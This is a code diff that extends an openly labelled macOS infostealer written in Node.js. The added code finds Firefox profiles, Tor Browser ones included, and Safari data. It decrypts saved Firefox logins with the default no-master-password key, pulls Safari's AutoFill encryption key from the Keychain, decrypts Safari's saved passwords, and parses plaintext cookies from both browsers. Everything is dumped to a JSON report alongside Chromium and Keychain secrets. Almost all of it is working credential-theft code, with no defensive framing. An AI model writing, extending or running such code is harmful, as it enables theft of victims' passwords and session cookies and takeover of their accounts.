@@ -5,9 +5,9 @@
  * -------------------
  * Zero-dependency Node.js stealer for macOS. Reads and decrypts browser
  * cookies + saved passwords from Chrome / Edge / Brave / Chromium / Vivaldi /
- * Opera (and any other Chromium-based app), plus a full macOS Keychain dump
- * of every saved password on the machine. Writes everything to a local JSON
- * file.
+ * Opera (and any other Chromium-based app), Firefox, and Safari, plus a full
+ * macOS Keychain dump of every saved password on the machine. Writes
+ * everything to a local JSON file.
  *
  * No npm dependencies: SQLite is parsed by hand (lib/sqlite.js), crypto uses
  * node:crypto, and the Keychain is read via the `security` CLI. This keeps it
@@ -234,13 +234,15 @@ const TABLE_VALIDATORS = {
     typeof vals[0] === 'string' && /^https?:\/\//i.test(vals[0]),
 };
 
-function readDb(file) {
+// `validators` maps table name -> row validator; defaults to the Chromium
+// TABLE_VALIDATORS. Pass a custom map to read other browsers' tables.
+function readDb(file, validators = TABLE_VALIDATORS) {
   try {
     const buf = fs.readFileSync(file);
     const tables = readSchema(buf);
     const out = {};
     for (const t of tables) {
-      const validator = TABLE_VALIDATORS[t.name];
+      const validator = validators[t.name];
       if (!validator) continue; // only read the tables we actually use
       // scanRecords returns rows as value arrays; key them by column name so
       // extractCookies/extractPasswords can use named fields.
@@ -403,6 +405,239 @@ function stealOtherApps() {
 }
 
 // ---------------------------------------------------------------------------
+// Firefox
+//
+// Profiles live at ~/.mozilla/firefox/* by default, but custom -profile dirs
+// (Tor Browser, camoufox, etc.) live under Application Support. We discover
+// any directory that looks like a Firefox profile. Cookies are plaintext in
+// cookies.sqlite (moz_cookies); saved passwords are in logins.json, encrypted
+// with AES-128-CBC. Without a master password the key is
+//   PBKDF2-HMAC-SHA256("password", "salt", 100000, 16)
+// and the on-disk value is base64( IV(16) + ciphertext ). Entries protected by
+// a master password are PBE-wrapped (DER) and cannot be decrypted without it.
+// ---------------------------------------------------------------------------
+function discoverFirefoxProfiles() {
+  const bases = [
+    path.join(os.homedir(), '.mozilla', 'firefox'),
+    path.join(APP_SUPPORT, 'Firefox', 'Profiles'),
+    path.join(APP_SUPPORT, 'TorBrowser-Data', 'Browser'),
+    path.join(APP_SUPPORT, 'camoufox', 'Profiles'),
+  ];
+  const profiles = [];
+  const seen = new Set();
+  for (const base of bases) {
+    if (!fs.existsSync(base)) continue;
+    let entries;
+    try { entries = fs.readdirSync(base, { withFileTypes: true }); } catch (e) { continue; }
+    for (const ent of entries) {
+      if (!ent.isDirectory()) continue;
+      const dir = path.join(base, ent.name);
+      if (seen.has(dir)) continue;
+      seen.add(dir);
+      if (
+        fs.existsSync(path.join(dir, 'cookies.sqlite')) ||
+        fs.existsSync(path.join(dir, 'logins.json')) ||
+        fs.existsSync(path.join(dir, 'prefs.js'))
+      ) {
+        profiles.push(dir);
+      }
+    }
+  }
+  return profiles;
+}
+
+// host is moz_cookies column 4.
+const FIREFOX_VALIDATORS = {
+  moz_cookies: (vals) =>
+    typeof vals[4] === 'string' && vals[4].includes('.') && !/\s/.test(vals[4]),
+};
+
+function firefoxDecryptor() {
+  // No-master-password key; try both SHA-256 (NSS key4 default) and SHA-1.
+  const keys = [
+    crypto.pbkdf2Sync('password', 'salt', 100000, 16, 'sha256'),
+    crypto.pbkdf2Sync('password', 'salt', 100000, 16, 'sha1'),
+  ];
+  return function (b64) {
+    if (typeof b64 !== 'string' || !b64) return null;
+    let b;
+    try { b = Buffer.from(b64, 'base64'); } catch (e) { return null; }
+    if (b.length <= 16 || b.length % 16 !== 0) return null; // not IV(16)+ct
+    const iv = b.slice(0, 16);
+    const ct = b.slice(16);
+    let best = null;
+    let bestScore = 0;
+    for (const key of keys) {
+      const out = tryCbc(key, iv, ct);
+      if (out === null) continue;
+      const sc = scoreText(out);
+      if (sc > bestScore) { bestScore = sc; best = out; }
+    }
+    return bestScore >= 0.8 ? best : null;
+  };
+}
+
+function stealFirefoxProfile(dir) {
+  const prof = { path: dir, cookies: [], passwords: [] };
+  const decrypt = firefoxDecryptor();
+  const cf = path.join(dir, 'cookies.sqlite');
+  if (fs.existsSync(cf)) {
+    const tables = readDb(cf, FIREFOX_VALIDATORS);
+    if (tables && tables.moz_cookies) {
+      for (const r of tables.moz_cookies) {
+        prof.cookies.push({
+          host: r.host,
+          name: r.name,
+          value: r.value,
+          path: r.path,
+          is_secure: r.isSecure,
+          is_httponly: r.isHttpOnly,
+          expiry: r.expiry,
+        });
+      }
+    }
+  }
+  const lf = path.join(dir, 'logins.json');
+  if (fs.existsSync(lf)) {
+    try {
+      const j = JSON.parse(fs.readFileSync(lf, 'utf8'));
+      for (const l of j.logins || []) {
+        const entry = {
+          url: l.formSubmitURL || l.hostname,
+          hostname: l.hostname,
+          http_realm: l.httpRealm,
+          username: null,
+        };
+        const u = decrypt(l.encryptedUsername);
+        if (u !== null) entry.username = u;
+        const p = decrypt(l.encryptedPassword);
+        if (p !== null) entry.password = p;
+        else {
+          entry.decryption_failed = true;
+          if (l.encryptedPassword) entry.encrypted_password = l.encryptedPassword;
+        }
+        prof.passwords.push(entry);
+      }
+    } catch (e) {}
+  }
+  return prof;
+}
+
+function stealFirefox() {
+  const result = { name: 'firefox', profiles: [], total_cookies: 0, total_passwords: 0 };
+  for (const dir of discoverFirefoxProfiles()) {
+    const prof = stealFirefoxProfile(dir);
+    result.profiles.push(prof);
+    result.total_cookies += prof.cookies.length;
+    result.total_passwords += prof.passwords.length;
+  }
+  return result;
+}
+
+// ---------------------------------------------------------------------------
+// Safari
+//
+// Saved passwords live in ~/Library/Safari/DataVault.db (SFAutoFillCredential
+// table), encrypted with a key stored in the Keychain as
+// "Safari Forms AutoFill Encryption Key" (AES-128-CBC, IV(16)+ciphertext).
+// Cookies live in ~/Library/Cookies/Cookies.binarycookies (a binary format).
+// Both paths are TCC-protected on recent macOS, so we read them when permitted
+// and report them as unavailable otherwise.
+// ---------------------------------------------------------------------------
+function makeSafariDecryptor(key) {
+  if (!key || key.length < 16) return null;
+  const k = key.slice(0, 16);
+  return function (blob) {
+    if (!blob || !(blob instanceof Buffer) || blob.length <= 16) return null;
+    const iv = blob.slice(0, 16);
+    const ct = blob.slice(16);
+    if (ct.length % 16 !== 0) return null;
+    const out = tryCbc(k, iv, ct);
+    return out !== null && scoreText(out) >= 0.8 ? out : null;
+  };
+}
+
+// Parse ~/Library/Cookies/Cookies.binarycookies (magic "ck2b").
+function parseBinaryCookies(buf) {
+  const out = [];
+  if (buf.length < 12 || buf.toString('ascii', 0, 4) !== 'ck2b') return out;
+  let off = 8;
+  const count = buf.readUInt32BE(4);
+  for (let i = 0; i < count; i++) {
+    if (off + 48 > buf.length) break;
+    const creation = buf.readUInt32BE(off);
+    const expiration = buf.readUInt32BE(off + 4);
+    const pathLen = buf.readUInt32BE(off + 8);
+    const domainLen = buf.readUInt32BE(off + 12);
+    const nameLen = buf.readUInt32BE(off + 16);
+    const valueLen = buf.readUInt32BE(off + 20);
+    const isSecure = buf.readUInt32BE(off + 24);
+    const isDomain = buf.readUInt32BE(off + 28);
+    const isHTTPOnly = buf.readUInt32BE(off + 32);
+    off += 48;
+    const total = pathLen + domainLen + nameLen + valueLen;
+    if (off + total > buf.length) break;
+    const path = buf.toString('utf8', off, off + pathLen);
+    const domain = buf.toString('utf8', off + pathLen, off + pathLen + domainLen);
+    const name = buf.toString('utf8', off + pathLen + domainLen, off + pathLen + domainLen + nameLen);
+    const value = buf.toString('utf8', off + pathLen + domainLen + nameLen, off + total);
+    off += total;
+    out.push({
+      host: domain,
+      name,
+      value,
+      path,
+      is_secure: !!isSecure,
+      is_httponly: !!isHTTPOnly,
+      creation,
+      expiration,
+    });
+  }
+  return out;
+}
+
+function stealSafari() {
+  const safariDir = path.join(os.homedir(), 'Library', 'Safari');
+  const result = {
+    name: 'safari',
+    dir: safariDir,
+    exists: fs.existsSync(safariDir),
+    keychain_key: null,
+    cookies: [],
+    passwords: [],
+    total_cookies: 0,
+    total_passwords: 0,
+  };
+  const keyB64 = keychainGet('Safari Forms AutoFill Encryption Key', null);
+  result.keychain_key = keyB64;
+  const decrypt = makeSafariDecryptor(keyB64 ? Buffer.from(keyB64, 'base64') : null);
+  // DataVault.db -> SFAutoFillCredential (password column is an encrypted blob).
+  const dv = path.join(safariDir, 'DataVault.db');
+  if (fs.existsSync(dv)) {
+    const tables = readDb(dv, { SFAutoFillCredential: () => true });
+    for (const r of (tables && tables.SFAutoFillCredential) || []) {
+      const enc = r.password;
+      const dec = decrypt ? decrypt(enc) : null;
+      const entry = { username: r.username, realm: r.realm || r.hostname };
+      if (dec !== null) entry.password = dec;
+      else {
+        entry.decryption_failed = true;
+        if (enc instanceof Buffer) entry.encrypted_password = enc.toString('hex');
+      }
+      result.passwords.push(entry);
+    }
+  }
+  // Cookies.binarycookies (plaintext).
+  const cb = path.join(os.homedir(), 'Library', 'Cookies', 'Cookies.binarycookies');
+  if (fs.existsSync(cb)) {
+    try { result.cookies = parseBinaryCookies(fs.readFileSync(cb)); } catch (e) {}
+  }
+  result.total_cookies = result.cookies.length;
+  result.total_passwords = result.passwords.length;
+  return result;
+}
+
+// ---------------------------------------------------------------------------
 // Main
 // ---------------------------------------------------------------------------
 function main() {
@@ -412,6 +647,8 @@ function main() {
     platform: `${os.platform()} ${os.release()} (${os.arch()})`,
     node: process.version,
     browsers: [],
+    firefox: null,
+    safari: null,
     other_apps: [],
     keychain: null,
   };
@@ -420,6 +657,10 @@ function main() {
     report.browsers.push(r);
     log(`${browser.name}: ${r.exists ? (r.total_cookies + ' cookies, ' + r.total_passwords + ' passwords' + (r.keychain_secret ? '' : ' [NO KEYCHAIN SECRET]')) : '(not installed)'}`);
   }
+  report.firefox = stealFirefox();
+  log(`firefox: ${report.firefox.total_cookies} cookies, ${report.firefox.total_passwords} passwords (${report.firefox.profiles.length} profiles)`);
+  report.safari = stealSafari();
+  log(`safari: ${report.safari.total_cookies} cookies, ${report.safari.total_passwords} passwords${report.safari.exists ? '' : ' (dir not readable)'}`);
   report.other_apps = stealOtherApps();
   for (const app of report.other_apps) log(`${app.name} (other): ${app.total_cookies} cookies, ${app.total_passwords} passwords`);
   log('Dumping keychain...');
